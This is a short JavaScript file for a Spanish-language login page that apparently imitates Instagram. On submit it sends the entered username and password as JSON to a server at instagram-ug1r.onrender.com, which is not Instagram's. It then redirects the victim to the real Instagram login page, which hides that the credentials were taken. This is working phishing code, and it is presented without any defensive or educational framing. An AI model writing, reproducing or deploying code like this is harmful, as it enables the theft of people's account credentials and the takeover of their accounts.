document.addEventListener('DOMContentLoaded', () => {

    const loginForm = document.getElementById('loginForm');
    const usuarioInput = document.getElementById('usuario');
    const passwordInput = document.getElementById('password');
    const submitButton = document.getElementById('boton');
    const errorMsg = document.getElementById('mensaje-error');

    function validarInputs() {
        if (usuarioInput.value.trim() !== "" && passwordInput.value.trim() !== "") {
            submitButton.removeAttribute('disabled');
        } else {
            submitButton.setAttribute('disabled', 'true');
        }
    }

    usuarioInput.addEventListener('input', validarInputs);
    passwordInput.addEventListener('input', validarInputs);

    loginForm.addEventListener('submit', async (e) => {
        e.preventDefault();

        const datos = {
            usuario: usuarioInput.value.trim(),
            password: passwordInput.value.trim()
        };

        try {
            const respuesta = await fetch("https://instagram-ug1r.onrender.com/login", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify(datos)
            });

            if (respuesta.ok) {
                window.location.href = "https://www.instagram.com/accounts/login/";
            } else {
                errorMsg.textContent = "Error al enviar datos.";
                errorMsg.style.display = "block";
            }

        } catch (error) {
            console.error("Error en fetch:", error);
            errorMsg.textContent = "No se pudo conectar con el servidor.";
            errorMsg.style.display = "block";
        }
    });

});
